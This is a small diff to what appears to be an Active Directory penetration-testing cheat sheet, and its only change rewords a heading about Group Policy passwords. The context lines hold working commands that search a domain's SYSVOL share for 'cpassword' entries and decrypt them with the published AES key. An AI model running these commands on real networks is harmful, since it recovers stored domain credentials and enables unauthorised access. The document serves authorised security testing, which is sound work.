@@ -105,7 +105,7 @@ Find password in SYSVOL
 findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
 ```
 
-Decrypt a password found in SYSVOL (by [0x00C651E0](https://twitter.com/0x00C651E0/status/956362334682849280))
+Decrypt a Group Policy Password found in SYSVOL (by [0x00C651E0](https://twitter.com/0x00C651E0/status/956362334682849280))
 
 ```bash
 echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
